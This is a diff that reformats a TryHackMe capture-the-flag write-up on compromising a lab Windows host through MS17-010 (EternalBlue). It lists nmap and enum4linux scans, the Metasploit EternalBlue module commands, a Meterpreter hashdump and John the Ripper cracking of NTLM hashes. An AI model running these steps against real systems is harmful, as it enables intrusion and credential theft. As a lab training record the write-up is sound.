@@ -4,103 +4,114 @@
 **Platform:** TryHackMe  
 > ⚠️ This write-up is for educational purposes only. All activity was conducted within legal lab environments.
 
-This CTF focused on enumerating a Windows machine, identifying an SMB vulnerability, exploiting MS17-010 (EternalBlue), and performing post-exploitation steps including credential dumping and hash cracking to retrieve all flags.
+This CTF focused on enumerating a Windows machine, identifying an SMB vulnerability, exploiting MS17-010 (EternalBlue), and performing post-exploitation actions including dumping and cracking password hashes to capture all flags.
 
 ---
 
-## 🎯 Target: Windows Server (SMB / MS17-010)
+## 🎯 Target: Windows Server
 
 ### 🔍 Nmap Scan
 
-```bash
+~~~bash
 nmap -sS -sV -sC -T4 <IP>
-Explanation: Performs a TCP SYN scan (-sS), service version detection (-sV), and runs default NSE scripts (-sC). The -T4 flag speeds up scanning.
+~~~
 
-Result Summary:
+**Explanation:** Performs a TCP SYN scan (`-sS`), service version detection (`-sV`), and runs default NSE scripts (`-sC`). The `-T4` flag speeds up scanning.
 
-arduino
-Copy code
+**Result:**
+~~~
 445/tcp open  microsoft-ds
-SMB service discovered.
+~~~
 
-📡 SMB Enumeration
-Enumerated SMB details using:
+---
 
-bash
-Copy code
+## 📡 SMB Enumeration
+
+~~~bash
 enum4linux -A <IP>
-Explanation: Enumerates SMB shares, users, policies, and server information.
+~~~
+
+**Explanation:** Enumerates SMB shares, users, OS information, and security policies.
 
 Findings:
+- SMBv1 enabled  
+- Host information and shares discovered  
+- SMB confirmed as valid attack surface
 
-SMBv1 supported
+---
 
-Host and share information discovered
+## 🧪 Vulnerability Scan (MS17-010)
 
-Confirmed SMB as a valid attack vector
-
-🧪 Vulnerability Scan (MS17-010)
-Confirmed EternalBlue vulnerability using Nmap's NSE script:
-
-bash
-Copy code
+~~~bash
 nmap --script smb-vuln-ms17-010 -T4 <IP>
-Explanation: Checks whether the SMB service is vulnerable to MS17-010 (EternalBlue).
+~~~
 
-Result: Target reported as VULNERABLE to MS17-010.
+**Explanation:** Checks whether the host is vulnerable to MS17-010.
 
-💥 Exploitation: EternalBlue
-Launched Metasploit and configured the EternalBlue module:
+**Result:**  
+Target confirmed **VULNERABLE** to EternalBlue.
 
-bash
-Copy code
+---
+
+## 💥 EternalBlue Exploitation
+
+~~~bash
 msfconsole
 use exploit/windows/smb/ms17_010_eternalblue
 set RHOSTS <IP>
 run
-Explanation: Executes the EternalBlue exploit, taking advantage of the SMBv1 vulnerability.
+~~~
 
-Outcome:
-Gained a SYSTEM-level Meterpreter session on the Windows target.
+**Explanation:** Launches the EternalBlue exploit, abusing SMBv1 to obtain SYSTEM-level access.
 
-🖥️ Post-Exploitation Enumeration
-Dumped NTLM password hashes:
+✅ **Result:** Meterpreter session opened as **NT AUTHORITY\SYSTEM**.
 
-bash
-Copy code
+---
+
+## 🖥️ Post-Exploitation Enumeration
+
+Dumped password hashes:
+
+~~~bash
 hashdump
-Explanation: Extracts SAM database password hashes from the compromised Windows system.
+~~~
 
 Saved hashes to a file:
 
-bash
-Copy code
+~~~bash
 echo "<hashes>" > hash.txt
-🔐 Password Cracking
-Cracked the extracted hashes using John the Ripper:
+~~~
 
-bash
-Copy code
+---
+
+## 🔐 Hash Cracking
+
+~~~bash
 john hash.txt --wordlist=rockyou.txt
-Explanation: Attempts to recover plaintext passwords using dictionary-based attacks.
+~~~
 
-Outcome:
-Recovered plaintext credentials, enabling full system access and retrieval of all flags.
+**Explanation:** Cracks NTLM hashes using John the Ripper and a dictionary attack.
 
-🧠 Summary
-Phase	Key Finding
-Enumeration	SMB detected, SMBv1 supported
-Vulnerability Check	MS17-010 confirmed
-Exploitation	EternalBlue → SYSTEM shell
-Post-Exploitation	NTLM hashes dumped & cracked
-Outcome	Full compromise + all flags retrieved
+Recovered plaintext passwords.
 
-💡 Lessons Learned
-Enumeration with enum4linux and targeted Nmap scripts provides deep insight into SMB configuration
+Checked **C:\Users**, **root directories**, and user profile locations to retrieve all available flags.
 
-EternalBlue demonstrates how a single unpatched vulnerability can lead to full SYSTEM compromise
+---
 
-NTLM hash extraction and cracking highlight essential Windows post-exploitation techniques
+## 🧠 Summary
 
-yaml
-Copy code
+| Phase | Key Finding |
+|-------|-------------|
+| Initial Enumeration | SMBv1 running on port 445 |
+| Vulnerability Scan | MS17-010 confirmed |
+| Exploitation | EternalBlue → SYSTEM shell |
+| Post-Exploitation | NTLM hashes dumped & cracked |
+| Outcome | Full compromise + all flags captured |
+
+---
+
+## 💡 Lessons Learned
+
+- SMBv1 is a high-risk protocol and should be disabled  
+- EternalBlue demonstrates the impact of unpatched critical vulnerabilities  
+- NTLM hash extraction and cracking are essential Windows post-exploitation workflow steps
